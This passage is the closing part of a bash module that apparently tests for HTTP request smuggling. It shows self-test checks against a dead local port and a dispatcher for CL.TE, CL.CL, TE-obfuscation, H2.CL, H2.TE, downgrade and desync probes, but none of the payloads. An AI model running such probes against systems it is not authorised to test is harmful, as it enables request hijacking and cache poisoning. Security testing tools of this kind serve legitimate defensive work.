    chk dead-verdict "$(printf '%s' "$out" | awk -F'\t' '$1=="VERDICT"{print $2}')" "unreachable"
    chk dead-rc      "$(sm_cmd_probe 127.0.0.1:9 >/dev/null 2>&1; echo $?)" "3"
    chk desync-rc    "$(sm_cmd_desync 127.0.0.1:9 >/dev/null 2>&1; echo $?)" "0"

    # usage errors, not crashes
    sm_cmd_probe 2>/dev/null;   chk prb-usage "$?" "2"
    sm_cmd_clte 2>/dev/null;    chk clte-usage "$?" "2"
    sm_cmd_clcl 2>/dev/null;    chk clcl-usage "$?" "2"
    sm_cmd_h2cl 2>/dev/null;    chk h2cl-usage "$?" "2"
    sm_cmd_downgrade 2>/dev/null; chk dg-usage "$?" "2"
    sm_cmd_desync 2>/dev/null;  chk ds-usage "$?" "2"
    sm_one_technique 127.0.0.1:9 / no-such-tech >/dev/null 2>&1; chk badtech "$?" "2"

    # shape contracts
    chk status-fields "$(sm_cmd_status_tsv | awk -F'\t' '{print NF}')" "6"
    chk status-module "$(sm_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(sm_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(sm_cmd_help | head -1 | grep -ci 'Request Smuggling')" "1"
    chk list-rows     "$(sm_cmd_list | grep -c '^TECHNIQUE')" "$n"
    chk framrows      "$(sm_cmd_framing | grep -c '^FRAMING')" "$f"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --probe)     shift; sm_cmd_probe "$@";;
    --clte)      shift; sm_cmd_clte "$@";;
    --clcl)      shift; sm_cmd_clcl "$@";;
    --te)        shift; sm_cmd_te "$@";;
    --teobfusc)  shift; sm_cmd_teobfusc "$@";;
    --h2cl)      shift; sm_cmd_h2cl "$@";;
    --h2te)      shift; sm_cmd_h2te "$@";;
    --downgrade) shift; sm_cmd_downgrade "$@";;
    --desync)    shift; sm_cmd_desync "$@";;
    --techniques) sm_cmd_techniques;;
    --framing)   sm_cmd_framing;;
    --list)      sm_cmd_list;;
    --status-tsv|--status) sm_cmd_status_tsv;;
    --menu)      sm_cmd_menu;;
    --selftest)  sm_selftest;;
    *)           sm_cmd_help;;
esac
